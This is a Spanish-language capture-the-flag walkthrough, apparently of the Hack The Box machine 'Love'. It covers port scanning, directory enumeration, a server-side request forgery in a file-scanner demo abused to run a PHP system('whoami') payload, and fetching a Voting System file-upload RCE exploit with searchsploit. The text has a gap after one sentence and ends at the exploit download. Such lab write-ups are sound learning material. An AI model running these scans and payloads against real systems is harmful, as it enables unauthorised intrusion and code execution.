
# Enumeración

```shell
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.129.48.103 -oG allPorts
```

```shell

 [*] IP Address: 10.129.48.103
 [*] Open ports: 80,135,139,443,445,3306,5000,5040,5985,5986,47001,49664,49665,49666,49667,49668,49669,49670
```

```shell
nmap -p 80,135,139,443,445,3306,5000,5040,5985,5986,47001,49664,49665,49666,49667,49668,49669,49670 -sCV 10.129.48.103 -oN targeted
```


## 80
En el puerto 80 encontramos un panel de login de `Voting System`

```shell
nmap --script http-enum -p 80 10.129.48.103 -oN WebScan 
```

```shell
/admin/: Possible admin folder
/admin/index.php: Possible admin folder
/Admin/: Possible admin folder
/icons/: Potentially interesting folder w/ directory listing
/images/: Potentially interesting directory w/ listing on 'apache/2.4.46 (win64) openssl/1.1.1j php/7.3.27'
/includes/: Potentially interesting directory w/ listing on 'apache/2.4.46 (win64) openssl/1.1.1j php/7.3.27'
```

Encontramos un panel de login de `Admin`

También encontramos una web bajo el subdominio `staging.love.htb`
Al acceder a ella vemos que es un scanner de ficheros gratuito, en la sección de `Demo` podemos introducir una URL para que nos la escanee.

En nuestra maquina atacante levantamos un servidor con `python` y le pasamos la URL, viendo desde nuestro servidor que tramita una petición con `GET`

Creamos un archivo llamado `test` que contenga cualquier tipo de contenido y se lo volvemos a pasar al scaner

Una vez se lo hemos pasado vemos que el contenido que le hemos pasado lo refleja por pantalla, al ser una pagina `PHP` puede ser que interprete código `.php`

Así que en el archivo que habíamos creado le introducimos un
```php
<?php
    system("whoami");
?>
```

Y lo volvemos a pasar al scaner, obteniendo
















 así que vamos a buscar vulnerabilidades que pueda tener el sistema de `Voting System`, vamos a usar [[SEARCHSPLOIT]]
```shell
searchsploit "voting system"
```

Encontramos una vulnerabilidad llamada `Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)`, se nos indica un archivo `.py` con el cual podemos intentar explotar esta vulnerabilidad, nos los traemos a la maquina con
```shell
searchsploit "voting system" -m php/webapps/49445.py

```
